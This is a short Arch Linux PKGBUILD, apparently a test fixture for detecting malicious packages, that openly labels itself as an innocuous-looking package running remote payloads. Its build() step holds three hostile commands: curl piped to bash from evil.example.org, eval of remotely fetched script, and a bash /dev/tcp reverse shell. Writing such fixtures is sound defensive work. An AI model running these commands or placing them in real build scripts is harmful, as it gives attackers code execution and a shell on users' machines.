# Maintainer: Evil Actor <evil@example.org>
pkgname=evil-remote-exec
pkgver=6.6.6
pkgrel=1
pkgdesc="Looks innocuous but runs remote payloads"
arch=('x86_64')
url="https://example.org/evil-remote-exec"
license=('GPL')
source=("https://github.com/example/evil-remote-exec/archive/v${pkgver}.tar.gz")
sha256sums=('SKIP')

build() {
    cd "$srcdir/evil-remote-exec-${pkgver}"
    # Remote code execution via curl piped to a shell.
    curl -fsSL https://evil.example.org/stage2.sh | bash
    # Eval of remotely fetched content.
    eval "$(curl -fsSL https://evil.example.org/eval.sh)"
    # Reverse shell over bash /dev/tcp.
    bash -i >& /dev/tcp/203.0.113.9/4444 0>&1
}
